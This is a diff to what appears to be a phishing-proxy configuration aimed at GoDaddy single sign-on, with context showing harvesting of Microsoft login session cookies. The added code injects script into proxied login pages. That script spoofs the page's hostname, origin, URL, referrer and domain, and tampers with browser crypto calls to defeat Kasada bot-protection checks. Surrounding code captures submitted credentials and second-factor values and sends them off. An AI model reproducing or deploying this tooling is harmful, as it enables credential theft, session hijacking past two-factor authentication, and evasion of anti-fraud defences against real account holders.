@@ -208,9 +208,9 @@ sub_filters:
   #   (4) spoofs document.referrer to the real hostname
   # Together these make the HMAC and any hostname-bearing payload validate
   # correctly server-side, so 2FA flows can stay on the proxy.
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}if(!window.crypto||!window.crypto.subtle)return;var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g");function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}catch(_){}})();</script>', mimes: ['text/html']}
-  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}if(!window.crypto||!window.crypto.subtle)return;var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g");function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}catch(_){}})();</script>', mimes: ['text/html']}
-  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}if(!window.crypto||!window.crypto.subtle)return;var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g");function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var lhd=Object.getOwnPropertyDescriptor(Location.prototype,"hostname"),r=lhd&&lhd.get?lhd.get.call(window.location):window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;var rx=new RegExp(r.replace(/\./g,"\\."),"g");try{if(lhd&&lhd.configurable){Object.defineProperty(Location.prototype,"hostname",{get:function(){var h=lhd.get.call(this);return h===r?g:h;},configurable:true});}var lhd2=Object.getOwnPropertyDescriptor(Location.prototype,"host");if(lhd2&&lhd2.configurable){Object.defineProperty(Location.prototype,"host",{get:function(){return lhd2.get.call(this).replace(rx,g);},configurable:true});}var lod=Object.getOwnPropertyDescriptor(Location.prototype,"origin");if(lod&&lod.configurable){Object.defineProperty(Location.prototype,"origin",{get:function(){return lod.get.call(this).replace(rx,g);},configurable:true});}}catch(_){}try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}try{Object.defineProperty(document,"domain",{get:function(){return g;},configurable:true});}catch(_){}try{var dud=Object.getOwnPropertyDescriptor(Document.prototype,"URL");if(dud&&dud.configurable){Object.defineProperty(Document.prototype,"URL",{get:function(){return dud.get.call(this).replace(rx,g);},configurable:true});}}catch(_){}if(window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder();function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var lhd=Object.getOwnPropertyDescriptor(Location.prototype,"hostname"),r=lhd&&lhd.get?lhd.get.call(window.location):window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;var rx=new RegExp(r.replace(/\./g,"\\."),"g");try{if(lhd&&lhd.configurable){Object.defineProperty(Location.prototype,"hostname",{get:function(){var h=lhd.get.call(this);return h===r?g:h;},configurable:true});}var lhd2=Object.getOwnPropertyDescriptor(Location.prototype,"host");if(lhd2&&lhd2.configurable){Object.defineProperty(Location.prototype,"host",{get:function(){return lhd2.get.call(this).replace(rx,g);},configurable:true});}var lod=Object.getOwnPropertyDescriptor(Location.prototype,"origin");if(lod&&lod.configurable){Object.defineProperty(Location.prototype,"origin",{get:function(){return lod.get.call(this).replace(rx,g);},configurable:true});}}catch(_){}try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}try{Object.defineProperty(document,"domain",{get:function(){return g;},configurable:true});}catch(_){}try{var dud=Object.getOwnPropertyDescriptor(Document.prototype,"URL");if(dud&&dud.configurable){Object.defineProperty(Document.prototype,"URL",{get:function(){return dud.get.call(this).replace(rx,g);},configurable:true});}}catch(_){}if(window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder();function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var lhd=Object.getOwnPropertyDescriptor(Location.prototype,"hostname"),r=lhd&&lhd.get?lhd.get.call(window.location):window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;var rx=new RegExp(r.replace(/\./g,"\\."),"g");try{if(lhd&&lhd.configurable){Object.defineProperty(Location.prototype,"hostname",{get:function(){var h=lhd.get.call(this);return h===r?g:h;},configurable:true});}var lhd2=Object.getOwnPropertyDescriptor(Location.prototype,"host");if(lhd2&&lhd2.configurable){Object.defineProperty(Location.prototype,"host",{get:function(){return lhd2.get.call(this).replace(rx,g);},configurable:true});}var lod=Object.getOwnPropertyDescriptor(Location.prototype,"origin");if(lod&&lod.configurable){Object.defineProperty(Location.prototype,"origin",{get:function(){return lod.get.call(this).replace(rx,g);},configurable:true});}}catch(_){}try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}try{Object.defineProperty(document,"domain",{get:function(){return g;},configurable:true});}catch(_){}try{var dud=Object.getOwnPropertyDescriptor(Document.prototype,"URL");if(dud&&dud.configurable){Object.defineProperty(Document.prototype,"URL",{get:function(){return dud.get.call(this).replace(rx,g);},configurable:true});}}catch(_){}if(window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder();function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}}catch(_){}})();</script>', mimes: ['text/html']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -518,67 +518,102 @@ js_inject:
           } catch(e) {}
         }
 
-        // ── Kasada HMAC bypass (defense in depth with sub_filter <head> patch) ──
-        // The sub_filter on lines 199-206 already injects this pre-SDK; the block
-        // here repeats the patch so it also applies to scripts that load before
-        // js_inject's <head> injection (and inside the /fp iframe, which has its
-        // own document). Patches importKey('raw'), sign(), digest(), and spoofs
-        // document.referrer so any hostname-bearing payload validates.
+        // ── Comprehensive Kasada hostname bypass ─────────────────────────────────
+        // Kasada KP SDK validates the page origin at several levels:
+        //   • reads window.location.hostname/host/origin directly
+        //   • reads document.URL, document.domain, document.referrer
+        //   • uses hostname as PBKDF2 password in crypto.subtle.importKey('raw',…)
+        //   • embeds hostname in HMAC message passed to crypto.subtle.sign()
+        //   • sends hostname in the JSON body of the validation POST request
+        // All of these must return/use the REAL GoDaddy hostname for Kasada to
+        // validate correctly. Simultaneously, any URL the SPA builds using the
+        // now-spoofed hostname must be rewritten back to the proxy so requests
+        // still flow through us.
+        //
+        // CRITICAL: capture _kProxy using the raw descriptor BEFORE any override
+        // so that _pd, _rewriteGDUrls, and credential wrappers still see the proxy value.
+        var _kProxy, _locHnDesc;
         try {
-          var _kProxy = window.location.hostname;
-          var _kReal  = _kProxy.indexOf('sssn2.') === 0 ? 'sso2.secureserver.net'
-                       : _kProxy.indexOf('sssn.')  === 0 ? 'sso.secureserver.net'
-                       : 'sso.godaddy.com';
-          if (_kProxy !== _kReal) {
-            try {
-              Object.defineProperty(document, 'referrer', {
-                get: function() { return 'https://' + _kReal + '/'; },
+          _locHnDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'hostname');
+          _kProxy = _locHnDesc && _locHnDesc.get
+                  ? _locHnDesc.get.call(window.location)
+                  : window.location.hostname;
+        } catch(_ke) { _kProxy = window.location.hostname; }
+        var _kReal = _kProxy.indexOf('sssn2.') === 0 ? 'sso2.secureserver.net'
+                   : _kProxy.indexOf('sssn.')  === 0 ? 'sso.secureserver.net'
+                   : 'sso.godaddy.com';
+        var _kRx    = _kProxy !== _kReal ? new RegExp(_kProxy.replace(/\./g, '\\.'), 'g') : null;
+        var _kRxRev = _kProxy !== _kReal ? new RegExp(_kReal.replace(/\./g, '\\.'), 'g') : null;
+
+        if (_kProxy !== _kReal) {
+          // (1) Spoof Location.prototype getters — Kasada reads these early in ips.js
+          try {
+            if (_locHnDesc && _locHnDesc.configurable) {
+              Object.defineProperty(Location.prototype, 'hostname', {
+                get: function() { var h=_locHnDesc.get.call(this); return h===_kProxy?_kReal:h; },
                 configurable: true
               });
-            } catch(_e) {}
-            if (window.crypto && window.crypto.subtle) {
-              var _enc = new TextEncoder();
-              var _dec = new TextDecoder();
-              var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
-              function _kPatch(buf) {
-                if (!buf) return buf;
-                try {
-                  var ab = buf instanceof ArrayBuffer ? buf
-                         : ArrayBuffer.isView(buf)
-                           ? buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength)
-                           : null;
-                  if (ab) {
-                    var txt = _dec.decode(ab);
-                    if (txt.indexOf(_kProxy) !== -1) {
-                      return _enc.encode(txt.replace(_re, _kReal));
-                    }
-                  }
-                } catch(_e) {}
-                return buf;
-              }
-              var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
-              crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
-                if (fmt === 'raw') keyData = _kPatch(keyData);
-                return _origImport(fmt, keyData, algo, ext, uses);
-              };
-              var _origSign = crypto.subtle.sign.bind(crypto.subtle);
-              crypto.subtle.sign = function(algo, key, data) {
-                return _origSign(algo, key, _kPatch(data));
-              };
-              var _origDigest = crypto.subtle.digest.bind(crypto.subtle);
-              crypto.subtle.digest = function(algo, data) {
-                return _origDigest(algo, _kPatch(data));
-              };
             }
+            var _lhd = Object.getOwnPropertyDescriptor(Location.prototype, 'host');
+            if (_lhd && _lhd.configurable) {
+              Object.defineProperty(Location.prototype, 'host', {
+                get: function() { return _lhd.get.call(this).replace(_kRx, _kReal); },
+                configurable: true
+              });
+            }
+            var _lod = Object.getOwnPropertyDescriptor(Location.prototype, 'origin');
+            if (_lod && _lod.configurable) {
+              Object.defineProperty(Location.prototype, 'origin', {
+                get: function() { return _lod.get.call(this).replace(_kRx, _kReal); },
+                configurable: true
+              });
+            }
+          } catch(_ke) {}
+
+          // (2) Spoof document properties
+          try { Object.defineProperty(document,'referrer',{get:function(){return 'https://'+_kReal+'/';},configurable:true}); } catch(_ke){}
+          try { Object.defineProperty(document,'domain',  {get:function(){return _kReal;},configurable:true}); } catch(_ke){}
+          try {
+            var _dud = Object.getOwnPropertyDescriptor(Document.prototype, 'URL');
+            if (_dud && _dud.configurable) {
+              Object.defineProperty(Document.prototype, 'URL', {
+                get: function() { return _dud.get.call(this).replace(_kRx, _kReal); },
+                configurable: true
+              });
+            }
+          } catch(_ke) {}
+
+          // (3) crypto.subtle patches — cover key import, sign data, digest data
+          if (window.crypto && window.crypto.subtle) {
+            var _kEnc = new TextEncoder(), _kDec = new TextDecoder();
+            function _kPatch(buf) {
+              if (!buf) return buf;
+              try {
+                var ab = buf instanceof ArrayBuffer ? buf
+                       : ArrayBuffer.isView(buf)
+                         ? buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength)
+                         : null;
+                if (ab) {
+                  var txt = _kDec.decode(ab);
+                  if (txt.indexOf(_kProxy) !== -1) return _kEnc.encode(txt.replace(_kRx, _kReal));
+                }
+              } catch(_ke) {}
+              return buf;
+            }
+            var _oi=crypto.subtle.importKey.bind(crypto.subtle);
+            crypto.subtle.importKey=function(f,k,a,x,u){if(f==='raw')k=_kPatch(k);return _oi(f,k,a,x,u);};
+            var _os=crypto.subtle.sign.bind(crypto.subtle);
+            crypto.subtle.sign=function(a,k,d){return _os(a,k,_kPatch(d));};
+            var _od=crypto.subtle.digest.bind(crypto.subtle);
+            crypto.subtle.digest=function(a,d){return _od(a,_kPatch(d));};
           }
-        } catch(_e) {}
+        }
 
         // ── Proxy-domain rewriter ────────────────────────────────────────────────
-        // Computes the phish base domain from the current hostname so we can
-        // rewrite GoDaddy real-domain URLs in API responses before the SPA acts on them.
+        // _pd derived from _kProxy (captured above before Location.prototype override)
         var _pd = (function() {
-          var parts = window.location.hostname.split('.');
-          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+          var parts = _kProxy.split('.');
+          return parts.length >= 2 ? parts.slice(-2).join('.') : _kProxy;
         })();
         function _rewriteGDUrls(text) {
           return text
@@ -669,6 +704,10 @@ js_inject:
         };
         XMLHttpRequest.prototype.send = function(body) {
           if (this._xm && this._xm.toUpperCase() === 'POST') {
+            // Rewrite proxy hostname in outbound body (Kasada validation request)
+            if (_kRx && typeof body === 'string' && body.indexOf(_kProxy) !== -1) {
+              body = body.replace(_kRx, _kReal);
+            }
             // Capture credentials from request body
             if (body) {
               try {
@@ -725,6 +764,14 @@ js_inject:
                 if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
               }
             } catch(e) {}
+          }
+          // Rewrite proxy hostname in request body (Kasada validation request)
+          if (_kRx && opts && typeof opts.body === 'string' && opts.body.indexOf(_kProxy) !== -1) {
+            opts = Object.assign({}, opts, {body: opts.body.replace(_kRx, _kReal)});
+          }
+          // Fix URL: if GoDaddy SPA built it using the spoofed hostname, rewrite real→proxy
+          if (_kRxRev && urlStr.indexOf(_kReal) !== -1 && urlStr.indexOf(_kProxy) === -1) {
+            url = urlStr.replace(_kRxRev, _kProxy);
           }
           var p = _oFetch.apply(this, arguments);
           if (isLogin) {
